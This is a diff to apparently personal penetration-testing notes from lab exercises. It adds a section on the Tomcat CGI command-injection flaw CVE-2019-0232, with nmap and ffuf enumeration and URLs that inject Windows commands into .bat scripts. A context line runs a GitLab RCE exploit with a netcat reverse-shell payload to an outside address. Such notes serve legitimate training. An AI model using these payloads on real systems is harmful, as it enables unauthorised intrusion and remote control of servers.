@@ -792,5 +792,29 @@ Then:
 python3 gitlab_13_10_2_rce.py -t http://gitlab.company.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 ```
 # Tomcat CGI
-CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. 
-
+CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. <br>
+## Enumeration
+```
+nmap -p- -sC -Pn 10.129.204.227 --open
+```
+### Finding a CGI script
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+```
+or
+```
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+```
+## Exploitation
+Exacuting the `dir` command on the server by passing it as an argument to `hello.bat`:
+```
+http://example.com/cgi-bin/hello.bat?&dir
+```
+We can retrieve a list of environmental variables by calling the `set` command. If the PATH variable has been unset, we need to hardcode paths in requests:
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+```
+In case invalid character had been encountered, URL-encode the payload:
+```
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+```
